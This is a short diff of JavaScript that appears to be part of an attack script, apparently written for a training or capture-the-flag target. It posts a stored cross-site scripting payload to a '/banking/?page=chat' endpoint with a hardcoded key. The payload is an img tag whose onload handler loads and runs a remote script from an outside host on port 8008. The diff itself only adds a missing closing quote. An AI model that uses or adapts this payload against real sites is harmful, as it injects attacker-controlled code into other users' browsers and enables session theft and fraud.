@@ -15,7 +15,7 @@ console.log('still works');
     var payload =  "\\u003cimg+src=\\u0022data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\\u0022+onload=\\u0022script+=+document.createElement('script');script.src+='http://pfefferle.online:8008/f.js';document.head.appendChild(script);\\u0022\\u003e";
     x.open('POST', '/banking/?page=chat');
     x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    x.send('name=&message=' + encodeURIComponent(payload) + '&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden
+    x.send('name=&message=' + encodeURIComponent(payload) + '&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden'
 })();
 
 //req orig ff:
